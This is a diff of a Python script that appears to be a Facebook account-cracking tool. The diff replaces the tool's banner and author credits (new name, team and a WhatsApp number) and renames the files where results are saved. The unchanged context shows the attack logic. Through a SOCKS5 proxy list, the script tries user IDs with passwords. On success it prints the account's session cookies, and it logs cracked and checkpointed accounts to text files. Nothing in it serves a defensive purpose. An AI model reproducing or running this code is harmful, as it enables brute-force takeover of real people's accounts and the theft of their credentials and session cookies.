@@ -156,19 +156,20 @@ prox=open('socks5.txt','r').read().splitlines()
 
 logo=("""                  
 
-♥            ♥          \33[1;30m██╗  ██╗
-♥            ♥            \33[1;30m██║ ██╔╝
-♥ ♥ ♥ ♥             \33[1;30m█████╔╝ 
-♥            ❤              \33[1;30m██╔═██╗
-♥            ♥               \33[1;30m██║  ██╗
-                                     \33[1;30m╚═╝  ╚═╝
+.##..##...####....####....####....####...##..##.
+.##..##..##..##..##......##......##..##..###.##.
+.######..######...####....####...######..##.###.
+.##..##..##..##......##......##..##..##..##..##.
+.##..##..##..##...####....####...##..##..##..##.
+................................................ 
+			
 \033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
-╠══[\033[1;33m[•] AUTHOR   \33[0;m:\033[1;35m MURTAZA & \033[1;36mBARIE
-╠══[\033[1;32m[•] FACEBOOK \033[1;32m:\033[1;32m MURTAZA & \033[1;33mBARIE
-╠══[\033[1;35m[•] TEAM \033[1;34m    :\033[1;33m BM-KARWAN TEACH
-╠══[\033[1;34m[•] TELEGRAM \033[1;32m:\033[1;34m t.me/Karwantech12
+╠══[\033[1;33m[•] AUTHOR   \33[0;m:\033[1;35m Hassan & \033[1;36m Hassan 
+╠══[\033[1;32m[•] FACEBOOK \033[1;32m:\033[1;32m Hassan & \033[1;33m Karimi
+╠══[\033[1;35m[•] TEAM \033[1;34m    :\033[1;33m Hassan-TECH
+╠══[\033[1;34m[•] WhatsApp \033[1;32m:\033[1;34m 93705843630
 ╠══[\033[1;33m[•] STATUS\033[1;33m   :\033[1;31m FREE\33[1;37m
-╠══[\033[1;32m[•] VERSION  : 0.8
+╠══[\033[1;32m[•] VERSION  : 4.4
 \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;37m""")
 
 def lines():
@@ -496,15 +497,15 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[KARWAN-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
-                open('KARWAN-OK.txt', 'a').write(uid+' | '+ps+ '\n')
+                print('\033[1;32m[Hassan-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
+                open('Hassan -OK.txt', 'a').write(uid+' | '+ps+ '\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                #print('[KARWAN-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('KARWAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                #print('[Hassan -CP] '+uid+' | '+ps+'\x1b[1;97m')
+                open('Hassan -CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
